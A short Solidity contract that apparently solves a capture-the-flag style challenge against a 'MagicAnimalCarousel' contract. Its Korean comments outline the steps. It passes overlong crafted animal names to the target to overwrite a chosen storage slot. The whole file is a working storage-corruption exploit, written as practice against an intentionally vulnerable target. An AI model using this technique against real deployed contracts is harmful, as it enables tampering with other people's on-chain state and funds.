// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IMagicAnimalCarousel} from "src/IMagicAnimalCarousel.sol";

contract Solver {

    IMagicAnimalCarousel target;

    constructor(IMagicAnimalCarousel _target) {
        target = _target;
    }

    function solve(uint256 slot) public {
        // 슬롯 끝단으로 이동 준비
        target.setAnimalAndSpin("rabbit");
        bytes memory name = hex"ffffffffffffffffffffffff";
        target.changeAnimal(string(name), target.currentCrateId());

        // 타켓 위치로 덮어쓸 준비
        name = abi.encodePacked("horsehorse", abi.encodePacked(uint16(slot)));
        target.setAnimalAndSpin(string(name));

        // 덮어쓰기
        name = "rabbit";
        target.setAnimalAndSpin(string(name));
    }
}
